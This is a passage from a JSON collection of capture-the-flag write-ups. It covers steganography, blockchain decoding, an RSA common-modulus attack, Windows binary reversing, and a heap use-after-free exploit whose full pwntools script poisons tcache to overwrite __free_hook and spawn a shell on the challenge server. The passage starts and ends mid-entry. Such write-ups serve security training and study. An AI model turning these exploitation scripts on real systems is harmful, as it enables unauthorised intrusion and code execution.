=&gt; res.json())\n\n.then(json =&gt; console.log(json));\n\n</code></pre>\n<h3>Result</h3>\n<p>The server executed the code and returned the contents of <code>flag.txt</code>.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nnexus{7h1s_1s_no7_3v4l_Th1s_15_3v1lllllllllllllllllll}\n\n</code></pre>"
            },
            {
                "id": "can-you-hear-the-music?",
                "title": "Can You Hear The Music?",
                "category": "Miscellaneous",
                "tags": [
                    "sql",
                    "steg"
                ],
                "writeup": "<ol>\n<li>Initial Analysis</li>\n</ol>\n<p>The challenge provided a .wav file. My first step was to open it in an audio tool to inspect the spectrogram for visual flags.</p>\n<p>Action: Opened in Audacity/Sonic Visualizer.</p>\n<p>Observation: The spectrogram view was completely clean. No visual text or unusual frequency patterns were found. This suggested the data was hidden in the file structure or bits, not the audio frequencies.</p>\n<ol>\n<li>File Structure Check</li>\n</ol>\n<p>I ran binwalk to check for appended files or hidden archives.</p>\n<p>Command: binwalk oppenheimer_challenge.wav</p>\n<p>Result: A large number of \"MySQL MISAM\" false positives. This confirmed that the data was likely embedded using steganography within the audio stream itself, rather than just appended to the end of the file.</p>\n<ol>\n<li>Finding the Hint</li>\n</ol>\n<p>The challenge description contained the cryptic phrase: \"if you need something 'nexus' will help you.\" Given the clean spectrogram and binwalk results, I suspected \"nexus\" was a passphrase for a steganography tool.</p>\n<p>Command: steghide extract -sf oppenheimer_challenge.wav -p nexus</p>\n<p>Result: Successfully extracted a file named hint.txt.</p>\n<p>Content: now i am Become death, the deStroyer of worLds.</p>\n<ol>\n<li>Decoding the Hint</li>\n</ol>\n<p>The text in hint.txt had unusual capitalization:</p>\n<p>\"now i am Become death, the deStroyer of worLds.\"</p>\n<p>The letters B, S, and L were capitalized. Rearranging these letters gives LSB (Least Significant Bit), a common audio steganography technique where the last bit of each byte is replaced with secret data.</p>\n<ol>\n<li>Extraction and Flag</li>\n</ol>\n<p>Since standard LSB tools can vary in how they read bits (some read every byte, some skip bytes for 16-bit audio), I wrote a Python script to extract the LSBs directly.</p>\n<p>Initially, a standard 8-bit extraction returned garbage (\\x88\\x88...). Realizing the audio was likely 16-bit (where every second byte is a \"fine detail\" byte and the other is a \"coarse volume\" byte), I adjusted the script to read the LSB of every second byte.</p>\n<p>Solver Script (solver.py): Python</p>\n<p>import wave</p>\n<p>song = wave.open(\"oppenheimer_challenge.wav\", mode='rb') frame_bytes = bytearray(list(song.readframes(song.getnframes())))</p>\n<h2>Extract LSB from every 2nd byte (16-bit audio standard)</h2>\n<p>extracted = [frame_bytes[i] & 1 for i in range(0, len(frame_bytes), 2)]</p>\n<h2>Convert bits to characters</h2>\n<p>chars = [] for i in range(0, len(extracted), 8):     byte = extracted[i:i+8]     chars.append(chr(int(\"\".join(map(str, byte)), 2)))</p>\n<p>print(\"\".join(chars)[:50])</p>\n<p>Output: nexus{CcAn_Uu_Re3dD_LsB}</p>"
            },
            {
                "id": "chain-clue",
                "title": "Chain Clue",
                "category": "Miscellaneous",
                "tags": [
                    "encoding",
                    "http"
                ],
                "writeup": "<h5>1. Reconnaissance</h5>\n<p>Since we were given a transaction hash and the network name, the first step was to inspect the transaction using a Block Explorer. For the Sepolia testnet, the standard explorer is <strong>Sepolia Etherscan</strong>.</p>\n<h5>2. Analysis</h5>\n<p>I navigated to the transaction page: <code>https://sepolia.etherscan.io/tx/0x1c1e14180c2e5dceefc260208199e23a8c61524dd54bd2e378cee00e14555c14</code></p>\n<p>On the transaction details page, I examined the standard fields (From, To, Value). The value was <code>0 ETH</code>, indicating this transaction likely carried data rather than value.</p>\n<p>I looked at the <strong>\"Input Data\"</strong> field (also known as <code>calldata</code>). By default, Etherscan displays this in Hexadecimal format.</p>\n<p><strong>Hex Data:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\n0x6e657875737b54723463335f5468335f5472346e7334637431306e7d\n\n</code></pre>\n<h5>3. Decoding</h5>\n<p>The Hex string looked like standard ASCII encoding. I converted the view on Etherscan to <strong>UTF-8</strong> (or used a local Hex-to-Text converter).</p>\n<ul>\n<li><code>0x6e</code> -> <code>n</code></li>\n</ul>\n<ul>\n<li><code>0x65</code> -> <code>e</code></li>\n</ul>\n<ul>\n<li><code>0x78</code> -> <code>x</code></li>\n</ul>\n<ul>\n<li>...and so on.</li>\n</ul>\n<h5>4. Flag Capture</h5>\n<p>Converting the hex data revealed the plaintext flag directly.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">\nnexus{Tr4c3_Th3_Tr4ns4ct10n}\n\n</code></pre>"
            },
            {
                "id": "classic-oracle",
                "title": "Classic Oracle",
                "category": "Miscellaneous",
                "tags": [
                    "crypto",
                    "rsa",
                    "cipher",
                    "http",
                    "pwn",
                    "image"
                ],
                "writeup": "<h4>1. Challenge Overview</h4>\n<p>We are provided with a network service (<code>nc ctf.nexus-security.club 4338</code>) acting as an RSA oracle. The oracle has a fixed modulus N and a fixed secret flag m. Every time we query the oracle, it generates a fresh public exponent e and returns the encrypted flag c=me(modN).</p>\n<p>We are allowed 10 queries.</p>\n<h4>2. Reconnaissance & Analysis</h4>\n<p>Connecting to the server reveals the following behavior:</p>\n<ul>\n<li><strong>Modulus (N):</strong> Stays constant across all queries.</li>\n</ul>\n<ul>\n<li><strong>Message (m):</strong> The flag is constant.</li>\n</ul>\n<ul>\n<li><strong>Exponent (e):</strong> Changes with every query (e.g., <code>4344149288...</code>, <code>3817192702...</code>).</li>\n</ul>\n<p>This setup immediately suggests a <strong>Common Modulus Attack</strong>.</p>\n<h4>3. The Vulnerability</h4>\n<p>In RSA, if the same message m is encrypted with the same modulus N but different exponents e1\u200b,e2\u200b, we can recover m if gcd(e1\u200b,e2\u200b)=1.</p>\n<p>Using the <strong>Extended Euclidean Algorithm</strong>, we can find integers u,v such that:</p>\n<p>u\u22c5e1\u200b+v\u22c5e2\u200b=gcd(e1\u200b,e2\u200b)</p>\n<p>We can then combine the ciphertexts c1\u200b,c2\u200b to find the message raised to the power of the GCD:</p>\n<p>cnew\u200b\u2261c1u\u200b\u22c5c2v\u200b(modN)</p>\n<p>cnew\u200b\u2261(me1\u200b)u\u22c5(me2\u200b)v(modN)</p>\n<p>cnew\u200b\u2261mu\u22c5e1\u200b+v\u22c5e2\u200b\u2261mgcd(e1\u200b,e2\u200b)(modN)</p>\n<h4>4. The \"Twist\": GCD = 3</h4>\n<p>During the attack, we observed that combining multiple exponents did <strong>not</strong> result in an exponent of 1. Instead, the GCD converged to <strong>3</strong>.</p>\n<p>Plaintext</p>\n<pre><code class=\"\">\n[*] Fetching next pair to reduce exponent...\n\n    Got new e: 180026049740450541\n\n[*] Combined! New effective exponent: 3\n\n...\n\n</code></pre>\n<p>This means we recovered cfinal\u200b=m3(modN).</p>\n<p>Since the flag is a short string (likely < 100 bytes), its cubic value m3 is significantly smaller than the 1024-bit modulus N. Therefore, no modular wraparound occurred:</p>\n<p>cfinal\u200b=m3</p>\n<p>To get the flag, we simply calculate the integer cube root: m=3cfinal\u200b<img src=\"data:image/svg+xml;utf8,<svg%20xmlns=\"http://www.w3.org/2000/svg\"%20width=\"400em\"%20height=\"1.08em\"%20viewBox=\"0%200%20400000%201080\"%20preserveAspectRatio=\"xMinYMin%20slice\"><path%20d=\"M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0%20-0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834%2080h400000v40h-400000z\"></path></svg>\" alt=\"\" style=\"max-width:100%;\">\u200b.</p>\n<h4>5. Solution Script</h4>\n<p>Here is the final python script using <code>pwntools</code> to automate the attack.</p>\n<p>Python</p>\n<pre><code class=\"\">\nfrom pwn import *\n\nfrom Crypto.Util.number import long_to_bytes\n\n\n\nHOST = 'ctf.nexus-security.club'\n\nPORT = 4338\n\n\n\n# Extended Euclidean Algorithm\n\ndef egcd(a, b):\n\n    if a == 0:\n\n        return (b, 0, 1)\n\n    else:\n\n        g, y, x = egcd(b % a, a)\n\n        return (g, x - (b // a) * y, y)\n\n\n\n# Integer Cube Root\n\ndef integer_root(n, k):\n\n    low = 0\n\n    high = n\n\n    while low &lt; high:\n\n        mid = (low + high + 1) // 2\n\n        if mid ** k &lt;= n:\n\n            low = mid\n\n        else:\n\n            high = mid - 1\n\n    return low\n\n\n\ndef solve():\n\n    io = remote(HOST, PORT)\n\n    \n\n    # 1. Get first ciphertext pair\n\n    io.sendlineafter(b'&gt;', b'1')\n\n    io.recvuntil(b'e = ')\n\n    curr_e = int(io.recvline().strip())\n\n    io.recvuntil(b'c = ')\n\n    curr_c = int(io.recvline().strip())\n\n    io.recvuntil(b'n = ')\n\n    n = int(io.recvline().strip())\n\n    \n\n    print(f\"[+] Started with exponent: {curr_e}\")\n\n\n\n    # 2. Collect more pairs to reduce GCD\n\n    for _ in range(9):\n\n        if curr_e == 3:\n\n            print(\"[!] Exponent converged to 3. Stopping loop.\")\n\n            break\n\n            \n\n        io.sendline(b'1')\n\n        try:\n\n            io.recvuntil(b'e = ')\n\n            next_e = int(io.recvline().strip())\n\n            io.recvuntil(b'c = ')\n\n            next_c = int(io.recvline().strip())\n\n            io.recvuntil(b'n = ')\n\n            io.recvline() \n\n        except:\n\n            break\n\n\n\n        # Calculate Bezout coefficients\n\n        g, u, v = egcd(curr_e, next_e)\n\n        \n\n        # Combine ciphertexts: c_new = c1^u * c2^v mod n\n\n        # This results in m^gcd(e1, e2)\n\n        term1 = pow(curr_c, u, n)\n\n        term2 = pow(next_c, v, n)\n\n        curr_c = (term1 * term2) % n\n\n        curr_e = g\n\n        \n\n        print(f\"[*] Reduced exponent to: {curr_e}\")\n\n\n\n    # 3. Recover Flag\n\n    if curr_e == 3:\n\n        print(\"[+] Calculating cube root...\")\n\n        m_int = integer_root(curr_c, 3)\n\n        print(f\"[+] FLAG: {long_to_bytes(m_int).decode()}\")\n\n    elif curr_e == 1:\n\n        print(f\"[+] FLAG: {long_to_bytes(curr_c).decode()}\")\n\n    else:\n\n        print(\"[-] Failed to reduce exponent sufficiently.\")\n\n\n\n    io.close()\n\n\n\nif __name__ == \"__main__\":\n\n    solve()\n\n</code></pre>\n<h4>6. Result</h4>\n<p>Running the script quickly reduces the exponent to 3, computes the cube root, and prints the flag.</p>\n<p><strong>Flag:</strong> <code>nexus{GCD_0f_3xp0n3nts_R0cks}</code></p>"
            },
            {
                "id": "effortless",
                "title": "Effortless",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "buffer",
                    "shellcode",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<h4>1. Initial Analysis & Unpacking</h4>\n<p>We started with a Windows executable named <code>effortless.exe</code>. A quick inspection of the file strings or headers (specifically section names like <code>UPX0</code>, <code>UPX1</code>) revealed it was packed with <strong>UPX</strong>.</p>\n<p>To analyze the code logic, we first unpacked it:</p>\n<p>Bash</p>\n<pre><code class=\"\">\nupx -d effortless.exe\n\n</code></pre>\n<h4>2. Static Analysis</h4>\n<p>Loading the unpacked binary into Ghidra, we navigated to the <code>entry</code> function. Since <code>strings</code> didn't reveal the flag directly, we knew the program likely constructed it at runtime.</p>\n<p>We followed the call chain from <code>entry</code> to <code>WinMain</code> (<code>FUN_140001b34</code>). The <code>WinMain</code> function was straightforward:</p>\n<ol>\n<li>It performed some anti-debug checks (<code>IsDebuggerPresent</code>).</li>\n</ol>\n<ol>\n<li>It decrypted a class name and window title using XOR.</li>\n</ol>\n<ol>\n<li>It created a window using <code>CreateWindowExA</code> and entered a message loop.</li>\n</ol>\n<p>The core logic resided in the <strong>Window Procedure</strong> (<code>FUN_140001668</code>), which handles events like mouse clicks.</p>\n<h4>3. Analyzing the Window Procedure</h4>\n<p>Inside the Window Procedure, we found a handler for <code>WM_LBUTTONDOWN</code> (<code>0x201</code>) and <code>WM_RBUTTONDOWN</code> (<code>0x204</code>).</p>\n<p>The code was tracking user inputs:</p>\n<ul>\n<li><strong>Left Click (0x201):</strong> Stored the character <code>'L'</code> (0x4C).</li>\n</ul>\n<ul>\n<li><strong>Right Click (0x204):</strong> Stored the character <code>'R'</code> (0x52).</li>\n</ul>\n<p>These characters were saved into a buffer. Once the counter reached <strong>20 clicks</strong>, the program performed two checks:</p>\n<h5>The \"Effortless\" Bait (The Trap)</h5>\n<p>The code checked if the <strong>first</strong> and <strong>last</strong> clicks were both <code>'L'</code>.</p>\n<p>C</p>\n<pre><code class=\"\">\nif ((Buffer[0] == 'L') &amp;&amp; (Buffer[19] == 'L')) { ... }\n\n</code></pre>\n<p>If this condition was met, it executed a routine that displayed a MessageBox. However, as discovered during testing, this path was a troll/bait that likely displayed the text <strong>\"Enough thinking\"</strong> or a fake flag, discouraging further analysis.</p>\n<h5>The Real Solution (The Sequence)</h5>\n<p>If the \"Effortless\" check failed (or concurrently), the program compared the entire 20-click buffer against a generated sequence using <code>memcmp</code>:</p>\n<p>C</p>\n<pre><code class=\"\">\nFUN_140001380(TargetBuffer);\n\nif (memcmp(UserBuffer, TargetBuffer, 20) == 0) {\n\n    // Success path: Decrypt and execute shellcode/flag logic\n\n}\n\n</code></pre>\n<h4>4. Decrypting the Click Sequence</h4>\n<p>To find the correct sequence, we analyzed the generation function <code>FUN_140001380</code>. It initialized a byte array with 0s and 1s and transformed them:</p>\n<ul>\n<li><strong>Logic:</strong> <code>(-(cVar1 != '\\0') &amp; 6U) + 0x4C</code></li>\n</ul>\n<ul>\n<li><strong>0</strong> becomes <code>0x4C</code> ('L')</li>\n</ul>\n<ul>\n<li><strong>1</strong> becomes <code>0x52</code> ('R')</li>\n</ul>\n<p>Reconstructing the array from the code gave us the required sequence:</p>\n<p>|Click #|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20| |---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---| |<strong>Type</strong>|<strong>L</strong>|<strong>R</strong>|<strong>L</strong>|<strong>L</strong>|<strong>R</strong>|<strong>R</strong>|<strong>L</strong>|<strong>R</strong>|<strong>L</strong>|<strong>R</strong>|<strong>L</strong>|<strong>L</strong>|<strong>R</strong>|<strong>L</strong>|<strong>L</strong>|<strong>R</strong>|<strong>L</strong>|<strong>R</strong>|<strong>L</strong>|<strong>L</strong>|</p>\n<h4>5. Execution</h4>\n<p>We ran the unpacked executable and performed the clicks exactly as decoded: <strong>Left, Right, Left, Left, Right, Right, Left, Right, Left, Right, Left, Left, Right, Left, Left, Right, Left, Right, Left, Left.</strong></p>\n<p>Upon the 20th click, the application decrypted the memory and revealed the true flag.</p>\n<p><strong>Flag:</strong></p>\n<pre><code class=\"\">\nnexus{1_5p3n7_h0ur5_0n_7h15_bu7_17_w45_w0r7h_1t_7h4nk5_f0r_pl4y1ng}\n\n</code></pre>"
            },
            {
                "id": "ghostnote",
                "title": "Ghostnote",
                "category": "Miscellaneous",
                "tags": [
                    "pwn",
                    "heap"
                ],
                "writeup": "<h3>Vulnerability Analysis</h3>\n<p>The binary contains two critical <strong>Use-After-Free (UAF)</strong> vulnerabilities:</p>\n<ol>\n<li><strong>UAF Read:</strong> The <code>Show Note</code> function does not check if a note index has been freed before printing its content.</li>\n</ol>\n<ol>\n<li><strong>UAF Write:</strong> The <code>Edit Note</code> function does not check if a note index has been freed before allowing the user to modify its content.</li>\n</ol>\n<p>These vulnerabilities allow us to read heap metadata (leaking addresses) and corrupt heap metadata (manipulating the allocator).</p>\n<h3>Exploitation Strategy</h3>\n<h4>1. Leaking Libc Base (Unsorted Bin Leak)</h4>\n<p>To bypass ASLR, we need to leak a libc address.</p>\n<ul>\n<li><strong>Method:</strong> We allocate a chunk larger than the Tcache limit (e.g., <code>0x420</code> bytes). When freed, this chunk goes into the <strong>Unsorted Bin</strong> instead of the Tcache.</li>\n</ul>\n<ul>\n<li><strong>Leak:</strong> In the Unsorted Bin, the <code>fd</code> and <code>bk</code> pointers of the freed chunk point back to the <code>main_arena</code> within libc. By using the <strong>UAF Read</strong>, we print the content of this freed chunk to leak the address of <code>main_arena + 96</code>.</li>\n</ul>\n<ul>\n<li><strong>Calculation:</strong> <code>Libc Base = Leak - 96 - offset_of_main_arena</code>.</li>\n</ul>\n<h4>2. Tcache Poisoning (Arbitrary Write)</h4>\n<p>With the libc base known, we target the <strong>Tcache</strong> to get an arbitrary write primitive.</p>\n<ul>\n<li><strong>Method:</strong> We allocate and free a small chunk (e.g., <code>0x60</code> bytes) so it lands in the Tcache.</li>\n</ul>\n<ul>\n<li><strong>Corruption:</strong> Using the <strong>UAF Write</strong>, we overwrite the <code>fd</code> pointer of this freed chunk to point to <code>__free_hook</code>.</li>\n</ul>\n<ul>\n<li><strong>Poisoning:</strong> The next time we request a chunk of that size, the allocator returns the original chunk. The _subsequent_ request returns our target address (<code>__free_hook</code>).</li>\n</ul>\n<h4>3. Getting a Shell</h4>\n<ul>\n<li><strong>Overwrite:</strong> We write the address of <code>system()</code> into <code>__free_hook</code>.</li>\n</ul>\n<ul>\n<li><strong>Trigger:</strong> We verify that a chunk containing the string <code>/bin/sh</code> exists (or create one). We then call <code>delete()</code> on that chunk.</li>\n</ul>\n<ul>\n<li><strong>Execution:</strong> <code>free(ptr_to_bin_sh)</code> is replaced by <code>system(\"/bin/sh\")</code>, giving us a shell.</li>\n</ul>\n<h3>Final Solve Script</h3>\n<p>Python</p>\n<pre><code class=\"\">\nfrom pwn import *\n\n\n\n# Configuration\n\nexe = './chall'\n\nlibc_path = './libc.so.6'\n\nld_path = './ld-linux-x86-64.so.2'\n\n\n\ncontext.binary = elf = ELF(exe, checksec=False)\n\nlibc = ELF(libc_path, checksec=False)\n\n\n\n# Connect to Remote\n\np = remote('ctf.nexus-security.club', 2808)\n\n\n\ndef add(index, size, content):\n\n    p.sendlineafter(b'&gt; ', b'1')\n\n    p.sendlineafter(b'Index (0-9): ', str(index).encode())\n\n    p.sendlineafter(b'Size: ', str(size).encode())\n\n    p.sendlineafter(b'Content: ', content)\n\n\n\ndef delete(index):\n\n    p.sendlineafter(b'&gt; ', b'2')\n\n    p.sendlineafter(b'Index: ', str(index).encode())\n\n\n\ndef show(index):\n\n    p.sendlineafter(b'&gt; ', b'3')\n\n    p.sendlineafter(b'Index: ', str(index).encode())\n\n\n\ndef edit(index, content):\n\n    p.sendlineafter(b'&gt; ', b'4')\n\n    p.sendlineafter(b'Index: ', str(index).encode())\n\n    p.sendlineafter(b'New Content: ', content)\n\n\n\nlog.info(\"--- Step 1: Leaking Libc Base ---\")\n\n# Allocate chunk &gt; 0x410 for Unsorted Bin\n\nadd(0, 0x420, b'A'*8)\n\nadd(1, 0x20, b'Guard') # Guard chunk\n\n\n\ndelete(0) # Free to Unsorted Bin\n\n\n\nshow(0)   # UAF Read\n\np.recvuntil(b'Data: ')\n\nleak_raw = p.recvline(keepends=False)\n\nleak_val = u64(leak_raw.ljust(8, b'\\x00')[:8])\n\nlog.success(f\"Leaked Raw Address: {hex(leak_val)}\")\n\n\n\n# Calculate Libc Base (Unsorted bin fd -&gt; main_arena + 96)\n\nlibc.address = leak_val - 96 - 0x10 - libc.symbols['__malloc_hook']\n\nlog.success(f\"Libc Base: {hex(libc.address)}\")\n\n\n\nlog.info(\"--- Step 2: Tcache Poisoning ---\")\n\nadd(2, 0x60, b'Chunk 2')\n\nadd(3, 0x60, b'Chunk 3')\n\n\n\ndelete(3)\n\ndelete(2)\n\n\n\n# UAF Write: Point fd to __free_hook\n\nedit(2, p64(libc.symbols['__free_hook']))\n\n\n\n# Allocations to reach target\n\nadd(4, 0x60, b'/bin/sh\\x00')       # Chunk 2 recycled\n\nadd(5, 0x60, p64(libc.symbols['system'])) # Returns __free_hook, write system\n\n\n\nlog.info(\"--- Step 3: Trigger Shell ---\")\n\ndelete(4) # system(\"/bin/sh\")\n\n\n\np.interactive()\n\n</code></pre>\n<h3>Flag</h3>\n<p><code>nexus{h3ap_u4f_t0_tcache_p0is0ning_is_fun}</code></p>"
            },
            {
                "id": "grace",
                "title": "Grace",
                "category": "Miscellaneous",
                "tags": [
                    "cipher",
                    "xor",
                    "stack",
                    "reverse",
                    "ghidra"
                ],
                "writeup": "<p>---</p>\n<h4>1. Initial Reconnaissance</h4>\n<p>We started with a Windows executable named <code>grace.exe</code>.</p>\n<ul>\n<li><strong>File Analysis:</strong> The file headers contained strings like <code>UPX0</code>, <code>UPX1</code>, and <code>4.22 UPX!</code>, suggesting the binary was packed.</li>\n</ul>\n<ul>\n<li><strong>Deception:</strong> Running <code>upx -d grace.exe</code> failed, indicating the UPX headers were likely spoofed or the file was modified to prevent standard unpacking. However, opening the file in a decompiler (Ghidra) revealed readable code immediately, meaning the executable was not actually packed, or the \"packing\" was just section naming obfuscation.</li>\n</ul>\n<h4>2. Static Analysis (The Code)</h4>\n<p>Analyzing the <code>entry</code> function in Ghidra revealed the program's core logic:</p>\n<ol>\n<li><strong>Input:</strong> The program reads 64 bytes of user input (the password).</li>\n</ol>\n<ol>\n<li><strong>Verification:</strong> It processes this input through a complex hashing loop involving bitwise operations and a lookup table.</li>\n</ol>\n<ol>\n<li><strong>The Check:</strong> The result of the hash is compared to a hardcoded value <code>0x668bfb55</code>.</li>\n</ol>\n<ol>\n<li><strong>The Vulnerability:</strong></li>\n</ol>\n<ul>\n<li>If the hash matches, the program jumps to a <strong>decryption loop</strong>.</li>\n</ul>\n<ul>\n<li>If the hash fails, it decrypts a \"failure\" message.</li>\n</ul>\n<ul>\n<li>Crucially, <strong>the encrypted flag data and the decryption key are hardcoded in the binary.</strong></li>\n</ul>\n<p>We did not need to reverse the complex hash or find the correct password because we could simply emulate the decryption process ourselves.</p>\n<h4>3. The Decryption Logic</h4>\n<p>The decryption routine identified in the code was a simple XOR cipher:</p>\n<p>C</p>\n<pre><code class=\"\">\n// Decompiled Logic\n\nfor (iVar4 = -0x40; iVar4 != 0; iVar4 = iVar4 + 1) {\n\n    // Encrypted byte XOR Key\n\n    abStack_70[iVar4] = (&amp;UNK_0040515d)[iVar4] ^ 0xbc;\n\n}\n\n</code></pre>\n<ul>\n<li><strong>Algorithm:</strong> XOR</li>\n</ul>\n<ul>\n<li><strong>Key:</strong> <code>0xBC</code></li>\n</ul>\n<ul>\n<li><strong>Location:</strong> The loop uses a negative index (<code>-0x40</code> to <code>0</code>) relative to address <code>0x0040515d</code>. This means the data starts at <code>0x0040511d</code> (64 bytes prior).</li>\n</ul>\n<h4>4. Extraction & Solution</h4>\n<p>We located the encrypted bytes at offset <code>0x0040511d</code> in the binary. The first byte found was <code>0xD2</code>.</p>\n<p><strong>Manual Verification:</strong></p>\n<ul>\n<li>Encrypted Byte: <code>0xD2</code></li>\n</ul>\n<ul>\n<li>Key: <code>0xBC</code></li>\n</ul>\n<ul>\n<li>Decrypted: <code>0xD2 ^ 0xBC = 0x6E</code> -> <strong>'n'</strong></li>\n</ul>\n<p>Since the flag format is <code>nexus{...}</code>, this confirmed we found the correct data.</p>\n<p><strong>Solver Script:</strong> We used a Python script to extract the 64 bytes from the binary and decrypt them:</p>\n<p>Python</p>\n<pre><code class=\"\">\ndata = b'\\xd2\\xd9\\xc4\\xc7\\xc9\\xe7\\xce\\x8f\\x89\\xcf\\xce\\xe9\\x8d\\xca\\x8a\\xce\\x81\\x8f\\x8d\\xcf\\x8f\\xce\\x8e\\x89\\x8d\\xca\\x81\\xce\\x88\\x84\\xce\\x8e\\x8e\\x83\\x8f\\x85\\xce\\x80\\x8d\\x85\\x89\\xce\\x82\\x89\\xcf\\xce\\x8a\\x89\\xcf\\xe9\\x89\\x88'\n\nkey = 0xbc\n\nflag = ''.join([chr(b ^ key) for b in data])\n\nprint(flag)\n\n</code></pre>\n<h4>5. Conclusion</h4>\n<p>The challenge text (\"recursive vm inception\") implies the \"hash\" function we skipped was likely a virtual machine interpreter intended to make reversing the password difficult. However, by identifying that the flag was stored as data and decrypted upon success, we bypassed the VM analysis entirely (a \"Known Plaintext\" or \"Static Extraction\" attack).</p>\n<p><strong>Final Flag:</strong> <code>nexus{r3cur51v3_vm_1nc3p710n_7hr33_l4y3r5_d33p_n357ed}</code></p>"
            },
            {
                "id": "huntme1",
                "title": "HuntMe1",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<p>nexus{h1dd3n_1n_7h3_f0r357_4t_n1gh7} strings</p>"
            },
            {
                "id": "huntme2",
                "title": "HuntMe2",
                "category": "Miscellaneous",
                "tags": [
                    "xor",
                    "reverse",
                    "ghidra"
                ],
                "writeup": "<ol>\n<li>Initial Analysis (FUN_004013df)</li>\n</ol>\n<p>The main logic in FUN_004013df (the entry point after setup) showed that user input was read and then passed to a function named FUN_0040132a for validation. Success required FUN_0040132a to return a non-zero value.</p>\n<ol>\n<li>Core Validation Logic (FUN_0040132a)</li>\n</ol>\n<p>The analysis of FUN_0040132a revealed the core encryption scheme:</p>\n<p>Length Check: The input string must be exactly 32 bytes long (sVar2 == 0x20).</p>\n<p>Decryption Formula: The function iterated from i=0 to 31, comparing the input byte against a decryption key stream and a hardcoded encoded array. The successful condition was derived as:     Input[i]=E[i]\u2295KeyByte[i]</p>\n<p>Where:</p>\n<p>E[i] is the i-th byte of the 32-byte encoded array at DAT_00402060.</p>\n<p>KeyByte[i] is the result of the key generation function FUN_00401239(i).</p>\n<ol>\n<li>Key Generation Logic (FUN_00401239)</li>\n</ol>\n<p>The key stream was dynamically generated using the input index i and five 7-byte arrays (DAT_00402020 to DAT_0040203c).</p>\n<p>Internal Accumulator (local_9): The function iterated five times (local_10=0\u20264):</p>\n<p>It calculated an index local_1c using a formula involving local_10 and the input index i:         local_1c=((local_102)+((local_10+1)\u00d7i)+3)(mod7)</p>\n<p>It XORed the accumulator with the byte from the key material array M[local_10][local_1c].</p>\n<p>It then applied a custom bitwise rotation/mixing operation:         local_9=((XOR_Result\u226b7)\u2223(XOR_Result\u00d72))(mod256)</p>\n<p>Final Key Mixer: The accumulator (local_9) and the index i were passed to FUN_00401201 to produce the final key byte.</p>\n<ol>\n<li>Final Key Mixer (FUN_00401201)</li>\n</ol>\n<p>This function completed the key generation with a final mixing step:</p>\n<p>param_1=(local_9\u2295(local_9\u226a3))(mod256)     KeyByte[i]=(param_1\u2295(param_1\u226b5)\u2295(i\u00d70x3d))(mod256)</p>\n<ol>\n<li>Data Extraction (Ghidra)</li>\n</ol>\n<p>The final step involved extracting the hardcoded data from the binary's data section: Data Type       Address Hexadecimal Values Encoded Flag (E) (32 bytes)     DAT_00402060    F8 98 76 FB C9 0A 03 0D 44 3D 6B A6 C3 25 A8 60 FB 57 6C F3 A1 F0 CF 61 E6 E4 45 16 0E 18 3E 27 Key Material (M) (5 x 7 bytes)  DAT_00402020    A8 C5 83 A0 42 2C 01 CB 32 20 F3 CF 65 BC 13 79 B2 29 74 61 E7 A7 68 76 0A 4E 39 43 F1 CD 12 B2 7D 0B 2D</p>\n<ol>\n<li>Decryption and Solution</li>\n</ol>\n<p>A Python script was used to reverse the encryption logic:</p>\n<p>```python  ENCODED_FLAG = [     0xF8, 0x98, 0x76, 0xFB, 0xC9, 0x0A, 0x03, 0x0D, 0x44, 0x3D, 0x6B, 0xA6, 0xC3, 0x25, 0xA8, 0x60,     0xFB, 0x57, 0x6C, 0xF3, 0xA1, 0xF0, 0xCF, 0x61, 0xE6, 0xE4, 0x45, 0x16, 0x0E, 0x18, 0x3E, 0x27 ] # 32 bytes from DAT_00402060</p>\n<p>KEY_MATERIAL = [     [0xA8, 0xC5, 0x83, 0xA0, 0x42, 0x2C, 0x01], # DAT_00402020     [0xCB, 0x32, 0x20, 0xF3, 0xCF, 0x65, 0xBC], # DAT_00402027     [0x13, 0x79, 0xB2, 0x29, 0x74, 0x61, 0xE7], # DAT_0040202E     [0xA7, 0x68, 0x76, 0x0A, 0x4E, 0x39, 0x43], # DAT_00402035     [0xF1, 0xCD, 0x12, 0xB2, 0x7D, 0x0B, 0x2D]  # DAT_0040203C ]</p>\n<h2>--- 2. FUN_00401201 Implementation ---</h2>\n<p>def FUN_00401201(param_1: int, param_2: int) -> int:     \"\"\"byte FUN_00401201(byte param_1,char param_2)\"\"\"</p>\n<h2>param_1 = param_1 ^ param_1 << 3; (Masked to 8-bit)</h2>\n<p>param_1 = (param_1 ^ (param_1 << 3)) & 0xFF</p>\n<h2>return param_1 ^ param_1 >> 5 ^ param_2 * '=';</h2>\n<h2>'= (0x3D)'</h2>\n<p>result = param_1 ^ (param_1 >> 5) ^ (param_2 * 0x3D)     return result & 0xFF</p>\n<h2>--- 3. FUN_00401239 Implementation ---</h2>\n<p>def FUN_00401239(param_1: int) -> int:     \"\"\"undefined1 FUN_00401239(int param_1)\"\"\"     local_9 = 0 # byte local_9</p>\n<p>for local_10 in range(5):</p>\n<h2>local_1c = (local_10 * local_10 + (local_10 + 1) * param_1 + 3) % 7;</h2>\n<p>local_1c = ((local_10 * local_10) + ((local_10 + 1) * param_1) + 3) % 7</p>\n<p>local_18_local_1c = KEY_MATERIAL[local_10][local_1c]</p>\n<h2>local_9 ^ local_18[local_1c]</h2>\n<p>xor_result = local_9 ^ local_18_local_1c</p>\n<h2>local_9 = (xor_result) >> 7 | (xor_result) * '\\x02'; (0x02)</h2>\n<h2>This is a bit-wise mix, potentially a rotate left by 